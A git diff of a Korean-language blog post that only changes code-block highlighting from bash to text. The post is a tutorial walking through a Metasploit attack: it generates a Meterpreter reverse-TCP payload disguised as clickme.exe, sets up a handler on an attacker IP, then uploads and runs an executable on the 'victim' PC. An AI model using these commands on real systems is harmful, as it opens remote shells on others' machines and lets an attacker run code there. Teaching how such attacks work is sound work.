@@ -42,41 +42,41 @@ Do not try to attempt to break laws or do any illegal stuff by using this.
 {% include youtube_embed.html id="G-3jJCqQ_m8" %}
 - - -
 # 4. 공격 코드 설명
-{% highlight bash %}
+{% highlight text %}
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xxx.xxx LPORT=7777 -f exe -o clickme.exe
 {% endhighlight %}
 msfvenom을 이용해 페이로드(-p)로 윈도우즈 미터프리터 리버스 커넥션을 맺습니다. 여기서 리버스 커넥션이란, 외부에서 내부로 들어오는 inbound 트래픽은 방화벽에서 막지만, 그 반대인 outbound 트래픽의 경우 대부분은 허용해주는 것을 이용해 내부망에서 외부망으로 거꾸로 접속을 하도록하는 쉘코드를 의미합니다.  
 LHOST는 공격자 아이피이고 LPORT는 공격자 임의의 포트로 설정합니다.  
 포맷(-f)은 exe로 윈도우즈 실행 프로그램이며, clickme.exe 형태로 페이로드를 저장합니다.
 
-{% highlight bash %}
+{% highlight text %}
 msf5 > use exploit/multi/handler
 {% endhighlight %}
-{% highlight bash %}
+{% highlight text %}
 msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 {% endhighlight %}
-{% highlight bash %}
+{% highlight text %}
 msf5 exploit(multi/handler) > set lhost 192.168.xxx.xxx
 {% endhighlight %}
-{% highlight bash %}
+{% highlight text %}
 msf5 exploit(multi/handler) > set lport 7777
 {% endhighlight %}
-{% highlight bash %}
+{% highlight text %}
 msf5 exploit(multi/handler) > exploit
 {% endhighlight %}
 익스플로잇을 하고 희생자 pc에서 clickme.exe를 클릭하면 리버스 커넥션이 맺어졌다는 메시지와 함께 미터프리터 세션이 열렸다는 메시지를 받게 됩니다.
 
-{% highlight bash %}
+{% highlight text %}
 meterpreter > sysinfo
 {% endhighlight %}
 미터프리터 세션을 이용해 희생자 pc의 시스템 정보를 알아냅니다.
 
-{% highlight bash %}
+{% highlight text %}
 meterpreter > upload Warning.exe
 {% endhighlight %}
 Warning.exe라는, 공격자가 만들어낸 윈도우즈 실행파일을 희생자 pc에 업로드 시킵니다.
 
-{% highlight bash %}
+{% highlight text %}
 meterpreter > execute -f Warning.exe
 {% endhighlight %}
 공격자가 임의로 Warning.exe를 실행시킵니다.
